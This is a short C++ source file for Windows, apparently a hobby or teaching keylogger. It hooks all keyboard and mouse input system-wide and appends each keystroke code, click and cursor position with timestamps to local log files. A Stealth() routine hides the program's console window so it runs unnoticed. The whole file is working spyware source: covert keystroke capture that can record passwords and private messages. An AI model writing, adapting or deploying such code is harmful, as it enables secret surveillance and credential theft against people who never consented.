#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <stdio.h>
#include <fstream>
using namespace std;
#define key_log_file "key_log.txt"
#define mouse_log_file "mouse_log.txt"

int Save (fstream file);
void Stealth();
fstream file;

LRESULT CALLBACK key_proc(int nCode,WPARAM wParam,LPARAM lParam)
{
    PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
    file.open(key_log_file , ios::app | ios::out);
    if(wParam == WM_KEYDOWN)
        file << "-up\t" <<GetTickCount() <<  "\t" << p->vkCode << endl;
    if(wParam == WM_KEYUP)
        file << "-down\t" <<GetTickCount() <<  "\t" << p->vkCode << endl;
    file.close();
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

LRESULT CALLBACK mouse_proc(int nCode,WPARAM wParam,LPARAM lParam)
{
    MOUSEHOOKSTRUCT* mouse = (MOUSEHOOKSTRUCT*)lParam;
    string move_type;
    switch(wParam)
    {
    case WM_LBUTTONDOWN:
        move_type = "LBUTTONDOWN";
        break;
    case WM_LBUTTONUP:
        move_type = "LBUTTONUP";
        break;
    case WM_MOUSEMOVE:
        move_type = "MOUSEMOVE";
        break;
    case WM_MOUSEWHEEL:
        move_type = "MOUSEWHEEL";
        break;
    case WM_RBUTTONDOWN:
        move_type = "RBUTTONDOWN";
        break;
    case WM_RBUTTONUP:
        move_type = "RBUTTONUP";
        break;
    default:
        break;
    }
    file.open(mouse_log_file , ios::out | ios::app);
    file << move_type << "\t" << GetTickCount() << "\t" << (mouse->pt).x << "," << (mouse->pt).y<<endl;
    file.close();
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}
int main()
{
    Stealth();//use this line when we want to make the program to work
    HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, key_proc , 0, 0);
    SetWindowsHookEx(WH_MOUSE_LL , mouse_proc, 0 , 0 );
    MSG msg;
    while(!GetMessage(&msg, NULL, NULL, NULL))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    file.close();
}

void Stealth()
{
HWND Stealth;
AllocConsole();
Stealth = FindWindowA("ConsoleWindowClass", NULL);
ShowWindow(Stealth,0);
}
